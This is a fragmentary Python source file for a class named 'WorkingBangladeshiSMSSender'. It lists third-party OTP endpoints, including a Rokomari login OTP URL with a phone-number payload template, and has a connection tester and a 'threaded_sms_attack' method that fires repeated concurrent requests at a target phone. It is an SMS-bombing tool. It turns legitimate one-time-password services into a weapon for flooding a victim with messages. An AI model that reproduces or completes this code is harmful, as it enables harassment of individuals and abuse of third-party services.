...
class WorkingBangladeshiSMSSender:
    ...
    def load_working_apis(self):
        ...
        return [
            ...
            {
                'name': 'Rokomari OTP',
                'url': 'https://www.rokomari.com/api/login/otp/send',
                'method': 'POST',
                'payload': {"phone": "{phone}"},
                'headers': {'Content-Type': 'application/json'},
                'type': 'sms',
    ...
    def test_api_connection(self, api_config):
    ...
    def threaded_sms_attack(self, phone, total_requests=30, max_workers=5):
